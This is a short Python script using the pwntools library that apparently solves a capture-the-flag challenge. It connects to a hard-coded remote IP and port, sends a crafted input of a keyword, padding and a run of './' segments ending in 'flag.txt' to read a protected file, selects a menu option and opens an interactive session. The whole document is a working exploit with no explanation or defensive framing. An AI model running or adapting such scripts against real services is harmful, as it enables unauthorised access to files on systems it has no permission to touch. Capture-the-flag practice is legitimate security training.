from pwn import *

context.log_level = 'debug'
target = remote('39.107.92.230',10004)
target.recvuntil('yourself :')
payload = 'kaiokenx20' + 'A' * 6 + './' * 14 + 'flag.txt'
target.sendline(payload)
target.recvuntil('choice :')
target.sendline('8')
target.interactive()
